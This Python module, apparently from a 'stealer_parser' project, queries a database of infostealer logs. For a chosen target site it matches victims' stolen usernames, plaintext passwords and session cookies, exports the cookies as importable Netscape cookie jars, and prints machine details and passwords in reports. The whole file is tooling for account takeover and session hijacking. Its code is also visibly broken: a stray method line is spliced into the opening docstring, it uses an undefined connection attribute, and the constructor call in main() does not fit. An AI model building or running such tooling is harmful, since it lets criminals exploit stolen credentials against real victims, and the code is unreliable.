"""Component for finding matching credentials and cookies and exporting cook    def connect(self) -> None:
ie jars.
This component queries the database for credentials matching a specified host pattern,
finds cookies from the same systems that match the host pattern in their domain,
and exports the cookies in Netscape cookie jar format.
"""

import logging
import sys
from collections import defaultdict
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

try:
    import psycopg2
    from psycopg2.extras import DictCursor
    PSYCOPG2_AVAILABLE = True
except ImportError:
    psycopg2 = None  # type: ignore
    DictCursor = None  # type: ignore
    PSYCOPG2_AVAILABLE = False

from verboselogs import VerboseLogger


@dataclass
class CredentialCookieMatch:
    """Data class representing a matched credential with its associated cookies."""
    
    system_id: int
    machine_id: str
    computer_name: str
    hardware_id: str
    ip_address: str
    machine_user: str
    
    # Credential info
    credential_id: int
    username: str
    password: str
    host: str
    software: str
    credential_domain: str
    
    # Associated cookies
    cookies: List[Dict[str, Any]]


class CredentialCookieMatcher:
    """Finds credentials matching a host pattern and their associated cookies from the same system.
    
    This class queries the database for credentials containing a specified host string,
    finds cookies from the same systems that match the host pattern in their domain,
    groups and deduplicates them, and exports the cookies in Netscape cookie jar format.
    """
    
    def __init__(
        self,
        db_pool: Any,
        logger: Optional[VerboseLogger] = None,
    ) -> None:
        """Initialize the credential-cookie matcher.
        
        Parameters
        ----------
        db_pool : psycopg2.pool.SimpleConnectionPool
            A psycopg2 connection pool.
        logger : VerboseLogger, optional
            Logger instance for debugging.
        """
        self.logger = logger or VerboseLogger(__name__)
        self.db_pool = db_pool
        self.connection: Optional[Any] = None
        
        if not PSYCOPG2_AVAILABLE:
            raise ImportError(
                "psycopg2 is required for database support. "
                "Install it with: pip install psycopg2-binary"
            )
    
    def connect(self) -> None:
        """Connect to the PostgreSQL database."""
        try:
            self.connection = psycopg2.connect(**self.connection_params)  # type: ignore
            self.logger.debug("Connected to PostgreSQL database")
        except Exception as e:
            self.logger.error(f"Failed to connect to database: {e}")
            raise
    
    def disconnect(self) -> None:
        """Return a connection to the pool."""
        if self.connection:
            self.db_pool.putconn(self.connection)
            self.connection = None
            self.logger.debug("Returned connection to pool")
    
    def find_matching_credentials_and_cookies(self, host_pattern: str) -> List[CredentialCookieMatch]:
        """Find credentials matching host pattern and their associated cookies.
        
        Parameters
        ----------
        host_pattern : str
            The host pattern to search for in credential hosts and cookie domains.
            
        Returns
        -------
        List[CredentialCookieMatch]
            List of credential-cookie matches grouped by system and credential.
        """
        if not self.connection:
            self.connect()
        
        query = """
        SELECT 
            -- System information
            s.id as system_id,
            s.machine_id,
            s.computer_name,
            s.hardware_id,
            s.machine_user,
            s.ip_address,
            s.country,
            
            -- Credentials information
            c.id as credential_id,
            c.software,
            c.host,
            c.username,
            c.password,
            c.domain as credential_domain,
            c.filepath as credential_filepath,
            c.stealer_name as credential_stealer_name,
            
            -- Cookies information (may be NULL if no matching cookies)
            ck.id as cookie_id,
            ck.domain as cookie_domain,
            ck.domain_specified,
            ck.path,
            ck.secure,
            ck.expiry,
            ck.name as cookie_name,
            ck.value as cookie_value,
            ck.browser,
            ck.profile,
            ck.filepath as cookie_filepath,
            ck.stealer_name as cookie_stealer_name

        FROM systems s
        INNER JOIN credentials c ON s.id = c.system_id
        LEFT JOIN cookies ck ON s.id = ck.system_id 
            AND (
                ck.domain ILIKE %s 
                OR ck.domain = %s
                OR ck.domain = %s
                OR ck.domain LIKE %s
            )

        WHERE c.host ILIKE %s

        ORDER BY s.id, c.id, ck.id;
        """
        
        # Prepare search patterns
        host_wildcard = f"%{host_pattern}%"
        host_exact = host_pattern
        host_dot = f".{host_pattern}"
        host_subdomain = f"%.{host_pattern}"
        
        try:
            with self.connection.cursor(cursor_factory=DictCursor) as cursor:  # type: ignore
                cursor.execute(query, (
                    host_wildcard, host_exact, host_dot, host_subdomain,  # Cookie domain patterns
                    host_wildcard  # Credential host pattern
                ))
                rows = cursor.fetchall()
                
                self.logger.info(f"Found {len(rows)} credential-cookie combinations for host pattern: {host_pattern}")
                
                return self._group_results(rows)
                
        except Exception as e:
            self.logger.error(f"Error executing query: {e}")
            raise
    
    def _group_results(self, rows: List[Dict[str, Any]]) -> List[CredentialCookieMatch]:
        """Group query results by system and credential, deduplicating cookies.
        
        Parameters
        ----------
        rows : List[Dict[str, Any]]
            Raw query results from database.
            
        Returns
        -------
        List[CredentialCookieMatch]
            Grouped and deduplicated results.
        """
        # Group by (system_id, credential_id)
        grouped: Dict[Tuple[int, int], Dict[str, Any]] = {}
        
        for row in rows:
            key = (row['system_id'], row['credential_id'])
            
            if key not in grouped:
                grouped[key] = {
                    'system_id': row['system_id'],
                    'machine_id': row['machine_id'] or 'Unknown',
                    'computer_name': row['computer_name'] or 'Unknown',
                    'hardware_id': row['hardware_id'] or 'Unknown',
                    'machine_user': row['machine_user'] or 'Unknown',
                    'ip_address': row['ip_address'] or 'Unknown',
                    'credential_id': row['credential_id'],
                    'username': row['username'] or '',
                    'password': row['password'] or '',
                    'host': row['host'] or '',
                    'software': row['software'] or 'Unknown',
                    'credential_domain': row['credential_domain'] or '',
                    'cookies': [],
                    'seen_cookies': set()  # For deduplication
                }
            
            # Add cookie if present and not already seen
            if row['cookie_id'] is not None:
                # Create deduplication key based on domain, name, and path
                cookie_key = (
                    row['cookie_domain'],
                    row['cookie_name'],
                    row['path']
                )
                
                if cookie_key not in grouped[key]['seen_cookies']:
                    cookie_data = {
                        'id': row['cookie_id'],
                        'domain': row['cookie_domain'] or '',
                        'domain_specified': row['domain_specified'] or 'FALSE',
                        'path': row['path'] or '/',
                        'secure': row['secure'] or 'FALSE',
                        'expiry': row['expiry'] or '0',
                        'name': row['cookie_name'] or '',
                        'value': row['cookie_value'] or '',
                        'browser': row['browser'] or 'Unknown',
                        'profile': row['profile'] or 'default',
                        'filepath': row['cookie_filepath'] or '',
                        'stealer_name': row['cookie_stealer_name'] or ''
                    }
                    grouped[key]['cookies'].append(cookie_data)
                    grouped[key]['seen_cookies'].add(cookie_key)
        
        # Convert to CredentialCookieMatch objects
        results = []
        for data in grouped.values():
            # Remove the temporary seen_cookies set
            data.pop('seen_cookies', None)
            
            match = CredentialCookieMatch(**data)
            results.append(match)
        
        self.logger.info(f"Grouped into {len(results)} unique credential-cookie matches")
        return results
    
    def export_cookies_to_jar(
        self, 
        matches: List[CredentialCookieMatch], 
        output_dir: Path,
        filename_template: str = "{system_id}_{ip_address}_{credential_id}_{host}_cookies.txt"
    ) -> List[Path]:
        """Export cookies for each credential match to separate Netscape cookie jar files.
        
        Parameters
        ----------
        matches : List[CredentialCookieMatch]
            The credential-cookie matches to export.
        output_dir : Path
            Directory to save the cookie jar files.
        filename_template : str, default="{system_id}_{ip_address}_{credential_id}_{host}_cookies.txt"
            Template for generating filenames. Available variables:
            {system_id}, {credential_id}, {host}, {username}, {computer_name}, {ip_address}
            
        Returns
        -------
        List[Path]
            List of paths to created cookie jar files.
        """
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        created_files = []
        
        for match in matches:
            if not match.cookies:
                self.logger.debug(f"No cookies found for credential {match.credential_id} on system {match.system_id}")
                continue
            
            # Create safe filename
            safe_host = self._sanitize_filename(match.host)
            safe_username = self._sanitize_filename(match.username)
            safe_computer = self._sanitize_filename(match.computer_name)
            safe_ip = self._sanitize_filename(match.ip_address)
            
            filename = filename_template.format(
                system_id=match.system_id,
                credential_id=match.credential_id,
                host=safe_host,
                username=safe_username,
                computer_name=safe_computer,
                ip_address=safe_ip
            )
            
            output_path = output_dir / filename
            
            # Write cookie jar file
            self._write_netscape_cookie_jar(match, output_path)
            created_files.append(output_path)
            
            self.logger.info(f"Exported {len(match.cookies)} cookies to {output_path}")
        
        return created_files
    
    def _write_netscape_cookie_jar(self, match: CredentialCookieMatch, output_path: Path) -> None:
        """Write cookies in Netscape cookie jar format.
        
        The Netscape cookie jar format has 7 tab-delimited fields per line:
        domain, domain_specified, path, secure, expiry, name, value
        
        Parameters
        ----------
        match : CredentialCookieMatch
            The credential-cookie match containing cookies to export.
        output_path : Path
            Path to write the cookie jar file.
        """
        with open(output_path, 'w', encoding='utf-8') as f:
            # Write Netscape cookie jar header
            f.write("# Netscape HTTP Cookie File\n")
            f.write(f"# Extracted from system: {match.computer_name} ({match.ip_address})\n")
            f.write(f"# Machine ID: {match.machine_id}\n")
            f.write(f"# Hardware ID: {match.hardware_id}\n")
            f.write(f"# User: {match.machine_user}\n")
            f.write(f"# Credential: {match.username} @ {match.host}\n")
            f.write(f"# Password: {match.password}\n")
            f.write(f"# Software: {match.software}\n")
            f.write("# This is a generated file!  Do not edit.\n")
            f.write("\n")
            
            # Write cookies in Netscape format
            for cookie in match.cookies:
                # Ensure proper formatting for Netscape format
                domain = cookie['domain'] or ''
                domain_specified = self._format_boolean(cookie['domain_specified'])
                path = cookie['path'] or '/'
                secure = self._format_boolean(cookie['secure'])
                expiry = self._format_expiry(cookie['expiry'])
                name = cookie['name'] or ''
                value = cookie['value'] or ''
                
                # Write tab-delimited line
                line = f"{domain}\t{domain_specified}\t{path}\t{secure}\t{expiry}\t{name}\t{value}\n"
                f.write(line)
    
    def _format_boolean(self, value: str) -> str:
        """Format boolean values for Netscape cookie jar format.
        
        Parameters
        ----------
        value : str
            String representation of boolean value.
            
        Returns
        -------
        str
            'TRUE' or 'FALSE' as expected by Netscape format.
        """
        if isinstance(value, bool):
            return 'TRUE' if value else 'FALSE'
        
        value_lower = str(value).lower().strip()
        if value_lower in ('true', '1', 'yes', 'on'):
            return 'TRUE'
        else:
            return 'FALSE'
    
    def _format_expiry(self, expiry: str) -> str:
        """Format expiry timestamp for Netscape cookie jar format.
        
        Parameters
        ----------
        expiry : str
            Expiry timestamp in various formats.
            
        Returns
        -------
        str
            Unix timestamp string or '0' for session cookies.
        """
        if not expiry or expiry == '0':
            return '0'  # Session cookie
        
        # If it's already a Unix timestamp, return as-is
        try:
            int(expiry)
            return expiry
        except ValueError:
            # If it's not a valid timestamp, treat as session cookie
            return '0'
    
    def _sanitize_filename(self, filename: str) -> str:
        """Sanitize string for use in filenames.
        
        Parameters
        ----------
        filename : str
            String to sanitize.
            
        Returns
        -------
        str
            Sanitized filename safe for filesystem use.
        """
        if not filename:
            return "unknown"
        
        # Replace common problematic characters
        sanitized = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
        sanitized = sanitized.replace('*', '_').replace('?', '_').replace('"', '_')
        sanitized = sanitized.replace('<', '_').replace('>', '_').replace('|', '_')
        sanitized = sanitized.replace(' ', '_').replace('.', '_')
        
        # Limit length and remove leading/trailing underscores
        sanitized = sanitized[:50].strip('_')
        
        return sanitized or "unknown"
    
    def get_summary_report(self, matches: List[CredentialCookieMatch]) -> str:
        """Generate a summary report of credential-cookie matches.
        
        Parameters
        ----------
        matches : List[CredentialCookieMatch]
            The matches to summarize.
            
        Returns
        -------
        str
            Formatted summary report.
        """
        if not matches:
            return "No credential-cookie matches found."
        
        total_credentials = len(matches)
        total_cookies = sum(len(match.cookies) for match in matches)
        systems = set(match.system_id for match in matches)
        
        report_lines = [
            "=== Credential-Cookie Match Summary ===",
            f"Total Systems: {len(systems)}",
            f"Total Credentials: {total_credentials}",
            f"Total Cookies: {total_cookies}",
            "",
            "=== Details by System ===",
        ]
        
        # Group by system for detailed reporting
        by_system: Dict[int, List[CredentialCookieMatch]] = defaultdict(list)
        for match in matches:
            by_system[match.system_id].append(match)
        
        for system_id, system_matches in sorted(by_system.items()):
            system_cookies = sum(len(match.cookies) for match in system_matches)
            sample_match = system_matches[0]
            
            report_lines.extend([
                f"System {system_id}: {sample_match.computer_name} ({sample_match.ip_address})",
                f"  Machine ID: {sample_match.machine_id}",
                f"  Hardware ID: {sample_match.hardware_id}",
                f"  User: {sample_match.machine_user}",
                f"  Credentials: {len(system_matches)}",
                f"  Cookies: {system_cookies}",
                ""
            ])
            
            for match in system_matches:
                report_lines.append(f"    • {match.username} @ {match.host} (Password: {match.password}) ({len(match.cookies)} cookies)")
            
            report_lines.append("")
        
        return "\n".join(report_lines)


def main():
    """Example usage of the CredentialCookieMatcher."""
    import argparse
    from pathlib import Path
    
    parser = argparse.ArgumentParser(
        description="Find credentials and cookies matching a host pattern and export as cookie jars"
    )
    parser.add_argument("host_pattern", help="Host pattern to search for (e.g., 'stake.us', 'github.com')")
    parser.add_argument(
        "--output-dir", 
        type=Path, 
        default=Path("./cookie_exports"),
        help="Directory to save cookie jar files (default: ./cookie_exports)"
    )
    parser.add_argument("--db-host", default="localhost", help="Database host")
    parser.add_argument("--db-port", type=int, default=5432, help="Database port")
    parser.add_argument("--db-name", default="stealer_parser", help="Database name")
    parser.add_argument("--db-user", default="postgres", help="Database user")
    parser.add_argument("--db-password", default="", help="Database password")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    # Set up logging
    logger = VerboseLogger(__name__)
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)
    
    # Create console handler
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    try:
        # Initialize matcher
        matcher = CredentialCookieMatcher(
            logger=logger,
            host=args.db_host,
            port=args.db_port,
            database=args.db_name,
            user=args.db_user,
            password=args.db_password
        )
        
        logger.info(f"Searching for credentials and cookies matching: {args.host_pattern}")
        
        # Find matches
        matches = matcher.find_matching_credentials_and_cookies(args.host_pattern)
        
        if not matches:
            logger.warning(f"No matches found for host pattern: {args.host_pattern}")
            return 1
        
        # Print summary
        summary = matcher.get_summary_report(matches)
        print(summary)
        
        # Export cookie jars
        logger.info(f"Exporting cookies to: {args.output_dir}")
        created_files = matcher.export_cookies_to_jar(matches, args.output_dir)
        
        logger.info(f"Successfully created {len(created_files)} cookie jar files:")
        for file_path in created_files:
            logger.info(f"  - {file_path}")
        
        return 0
        
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        return 1
    except Exception as e:
        logger.error(f"Error: {e}")
        if args.verbose:
            logger.exception("Full traceback:")
        return 1
    finally:
        try:
            # Only disconnect if matcher was successfully created
            matcher.disconnect()  # type: ignore
        except NameError:
            # matcher was never created due to early exception
            pass


if __name__ == "__main__":
    sys.exit(main())